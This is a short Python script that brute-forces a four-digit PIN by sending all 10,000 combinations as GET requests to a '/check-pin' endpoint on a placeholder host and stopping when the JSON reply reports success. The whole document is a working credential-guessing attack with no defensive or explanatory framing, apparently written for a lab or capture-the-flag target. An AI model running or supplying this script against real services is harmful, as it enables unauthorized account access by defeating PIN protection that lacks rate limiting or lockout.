import requests

# Base URL (change if necessary)
base_url = "https://test.com"     # Input the URL

# Target endpoint
check_pin_url = f"{base_url}/check-pin"

def try_pin(pin):
    # Send GET request with PIN parameter
    params = {"pin": pin}
    try:
        response = requests.get(check_pin_url, params=params)
        print(f"Trying PIN: {pin} - Status Code: {response.status_code}")

        if response.status_code == 200:
            try:
                json_response = response.json()
                print("Response:", json_response)  # Debugging: See full response

                # Check if success is True
                if json_response.get("success"):
                    print(f"✅ Correct PIN found: {pin}")
                    print("Full response:\n", json_response)
                    return True
            except ValueError:
                print("Invalid JSON response:", response.text)
        return False

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False

# Brute-force 4-digit PINs
for pin in range(10000):
    pin_str = str(pin).zfill(4)  # Ensures 4-digit format
    if try_pin(pin_str):
        break  # Stop when the correct PIN is found
